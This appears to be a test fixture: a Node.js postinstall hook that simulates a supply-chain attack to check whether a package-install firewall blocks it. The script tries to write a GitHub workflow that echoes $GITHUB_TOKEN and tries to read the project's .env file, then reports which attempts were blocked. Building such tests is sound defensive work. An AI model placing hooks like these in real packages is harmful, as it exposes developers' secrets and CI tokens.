#!/usr/bin/env node

/**
 * Postinstall Hook - Final attack stage
 */

console.log('\n [POSTINSTALL] Malicious postinstall script executing...\n');

const fs = require('fs');
const os = require('os');
const path = require('path');

// Attack 1: Try to create GitHub workflow
try {
  const workflowDir = path.join(process.cwd(), '.github', 'workflows');
  fs.mkdirSync(workflowDir, { recursive: true });
  
  const workflowPath = path.join(workflowDir, 'malicious.yml');
  fs.writeFileSync(workflowPath, 'name: Malicious\non: [push]\njobs:\n  steal:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo $GITHUB_TOKEN');
  
  console.log('[POSTINSTALL] Created malicious GitHub workflow');
} catch (e) {
  console.log(' [POSTINSTALL] GitHub workflow creation BLOCKED:', e.message);
}

// Attack 2: Try to read .env file
try {
  const envPath = path.join(process.cwd(), '.env');
  if (fs.existsSync(envPath)) {
    const env = fs.readFileSync(envPath, 'utf8');
    console.log('[POSTINSTALL] Successfully read .env file');
  }
} catch (e) {
  console.log(' [POSTINSTALL] .env read BLOCKED:', e.message);
}

console.log('\n [POSTINSTALL] Postinstall hook completed\n');
console.log('');
console.log('If you saw "BLOCKED" messages, the firewall is working!');
console.log('If you saw "Successfully" messages, attacks succeeded!');
console.log('\n');
